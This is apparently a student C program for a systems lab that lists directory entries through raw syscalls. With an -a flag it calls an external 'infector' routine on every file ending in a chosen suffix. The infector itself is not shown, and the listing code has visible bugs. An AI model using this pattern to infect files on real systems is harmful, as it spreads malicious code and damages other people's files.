#define _GNU_SOURCE
#include "util.h"


#define SYS_WRITE 4
#define SYS_READ 3
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_lseek 19
#define SYS_getdents 141
#define O_RDONLY 0
#define O_DIRECTORY 0


#define STDOUT 1
#define STDIN 2

#define BUF_SIZE (128)
extern int system_call();
extern void infector(char* filename);

typedef struct dirent {
    int inode;
    int offset;
    short len;
    char buf[];
} ent;

int main(int argc, char *argv[])  {
    int sflag = 0, dflag = 0, aflag = 0, i;
    char *suffix;
    for(i = 1; i < argc; i++) 
        if(argv[i][0] == '-') {
            if(argv[i][1] == 's') {
                sflag = 1;
                suffix = argv[i + 1];
            }
            if(argv[i][1] == 'd') {
                dflag = 1;
            }
            if(argv[i][1] == 'a') {
                aflag = 1;
                suffix = argv[i + 1];
            }
        }
    char buf[8192];
    int fd = 0;
    struct dirent *entp = buf;
    int count;

    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if( fd < 0) {      
        return 0;
    }
    i = 0;
    count = system_call(SYS_getdents, fd, buf, 8192);
    while(i < count) {
        if (count == 0)
            break;
        if(sflag) {
            i = i + entp->len;
            entp = buf + i;
            if(entp->buf[strlen(entp->buf) - 1] == suffix[0]) {
                system_call(SYS_WRITE, STDOUT, "inode is: ", 10);
                system_call(SYS_WRITE, STDOUT, itoa(entp->inode), strlen(itoa(entp->inode)));
                system_call(SYS_WRITE, STDOUT, " offset is: ", 12);
                system_call(SYS_WRITE, STDOUT, itoa(entp->offset), strlen(itoa(entp->offset)));
                system_call(SYS_WRITE, STDOUT, " name: ", 6);
                system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
                system_call(SYS_WRITE, STDOUT, "\n", 1);
            }
        }
        if(aflag) {
            i = i + entp->len;
            entp = buf + i;
            if(entp->buf[strlen(entp->buf) - 1] == suffix[0]) {
                infector(entp->buf);
                system_call(SYS_WRITE, STDOUT, "\n", 1);
            }
        }
        else if(sflag == 0 && aflag == 0) {
            system_call(SYS_WRITE, STDOUT, "inode is: ", 10);
            system_call(SYS_WRITE, STDOUT, itoa(entp->inode), strlen(itoa(entp->inode)));
            system_call(SYS_WRITE, STDOUT, " offset is: ", 12);
            system_call(SYS_WRITE, STDOUT, itoa(entp->offset), strlen(itoa(entp->offset)));
            system_call(SYS_WRITE, STDOUT, " name: ", 6);
            system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
            i = i + entp->len;
            entp = buf + i;
        }
    }
    if (dflag && sflag) {
        system_call(SYS_WRITE, STDOUT, "printing files with suffix: ", 33);
        system_call(SYS_WRITE, STDOUT, suffix[0], 1);
    }
    if (dflag && sflag == 0 && aflag == 0) 
        system_call(SYS_WRITE, STDOUT, "printing all files in directory ", 33);    
    system_call(SYS_WRITE, STDOUT, "\n", 1);

    return 0;
}
